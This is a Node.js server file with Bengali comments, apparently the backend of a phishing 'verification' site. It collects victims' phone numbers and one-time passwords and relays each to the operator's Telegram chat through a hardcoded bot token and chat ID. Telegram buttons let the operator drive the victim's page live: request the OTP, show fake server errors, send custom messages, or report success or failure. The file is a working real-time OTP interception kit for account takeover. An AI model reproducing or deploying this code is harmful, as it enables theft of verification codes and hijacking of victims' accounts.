const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf, Markup } = require('telegraf');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const BOT_TOKEN = '8599585292:AAENAD4zbqo8bJL3XPzhcyAwdkR3buB_3gM';
const MY_CHAT_ID = '5967798239';
const bot = new Telegraf(BOT_TOKEN);

app.use(express.static('public'));

// রেন্ডার স্লিপ মোড চেক রুট
app.get('/ping', (req, res) => res.send('RYZE Server is Awake!'));

const activeUsers = {};
let lastAdminAction = {}; // কোন সেশনের জন্য কাস্টম মেসেজ লেখা হচ্ছে তা ট্র্যাক করতে

io.on('connection', (socket) => {
    
    socket.on('send_phone', async (data) => {
        const { phone, purpose } = data;
        activeUsers[socket.id] = { phone, purpose, socketId: socket.id };

        const msg = await bot.telegram.sendMessage(MY_CHAT_ID, 
            `👤 <b>নতুন ইউজার রিকোয়েস্ট</b>\n\n` +
            `📱 নম্বর: <code>${phone}</code>\n` +
            `🎯 উদ্দেশ্য: <b>${purpose}</b>\n` +
            `⏳ স্ট্যাটাস: <i>অপেক্ষমান...</i>`, 
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔢 OTP বক্স পাঠাও', `ask_otp_${socket.id}`)],
                    [Markup.button.callback('⚠️ Server Error', `srv_err_${socket.id}`)],
                    [Markup.button.callback('💬 কাস্টম মেসেজ', `cust_msg_${socket.id}`)],
                    [Markup.button.callback('❌ রিজেক্ট', `retry_phone_${socket.id}`)]
                ])
            }
        );
        activeUsers[socket.id].telegramMsgId = msg.message_id;
    });

    socket.on('send_otp', (otp) => {
        const user = activeUsers[socket.id];
        if (!user) return;

        bot.telegram.editMessageText(MY_CHAT_ID, user.telegramMsgId, null,
            `📩 <b>OTP ভেরিফিকেশন</b>\n\n` +
            `📱 নম্বর: <code>${user.phone}</code>\n` +
            `🔢 প্রাপ্ত OTP: <code>${otp}</code>\n\n` +
            `মেলাতে সুবিধা হলে নিচের একশন নিন:`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('✅ সঠিক (Success)', `verify_success_${socket.id}`)],
                    [Markup.button.callback('❌ ভুল OTP (Retry)', `verify_fail_${socket.id}`)],
                    [Markup.button.callback('💬 কাস্টম মেসেজ', `cust_msg_${socket.id}`)]
                ])
            }
        );
    });

    socket.on('disconnect', () => {
        // ইউজার চলে গেলেও ডাটা কিছুক্ষণ রাখি
    });
});

// --- টেলিগ্রাম বট হ্যান্ডলার ---

// ১. OTP বক্স দেখানো
bot.action(/ask_otp_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('show_otp_input');
    ctx.answerCbQuery("OTP বক্স পাঠানো হয়েছে");
});

// ২. সার্ভার এরর দেখানো
bot.action(/srv_err_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    io.to(socketId).emit('custom_msg', { title: "Server Error", icon: "⚙️", msg: "Internal server error occurred. Please try again after some time." });
    ctx.editMessageText("⚠️ ইউজারকে সার্ভার এরর মেসেজ দেখানো হয়েছে।");
});

// ৩. কাস্টম মেসেজ বাটন (এটি চাপলে বটকে মেসেজ পাঠাতে হবে)
bot.action(/cust_msg_(.+)/, (ctx) => {
    const socketId = ctx.match[1];
    lastAdminAction[ctx.chat.id] = { socketId, action: 'waiting_for_text' };
    ctx.reply("💬 এই ইউজারের জন্য আপনার মেসেজটি লিখুন:");
});

// ৪. কাস্টম মেসেজ টেক্সট রিসিভ করা
bot.on('text', (ctx) => {
    const adminData = lastAdminAction[ctx.chat.id];
    if (adminData && adminData.action === 'waiting_for_text') {
        const socketId = adminData.socketId;
        const messageText = ctx.message.text;

        io.to(socketId).emit('custom_msg', { title: "Admin Message", icon: "💬", msg: messageText });
        
        ctx.reply(`✅ মেসেজটি পাঠানো হয়েছে: "${messageText}"`);
        delete lastAdminAction[ctx.chat.id];
    }
});

// ৫. অন্যান্য বাটন (Success, Fail, Reject)
bot.action(/verify_success_(.+)/, (ctx) => {
    io.to(ctx.match[1]).emit('final_status', { status: 'success' });
    ctx.editMessageText("✅ ভেরিফিকেশন সফল করা হয়েছে।");
});

bot.action(/verify_fail_(.+)/, (ctx) => {
    io.to(ctx.match[1]).emit('final_status', { status: 'fail' });
    ctx.answerCbQuery("ভুল OTP জানানো হয়েছে");
});

bot.action(/retry_phone_(.+)/, (ctx) => {
    io.to(ctx.match[1]).emit('retry_phone');
    ctx.editMessageText("❌ রিকোয়েস্টটি রিজেক্ট করা হয়েছে।");
});

bot.launch();

// অটো পিং লজিক
setInterval(() => {
    http.get(`http://ryze-verification.onrender.com/ping`);
}, 10 * 60 * 1000);

server.listen(3000, () => console.log('RYZE Server Running...'));
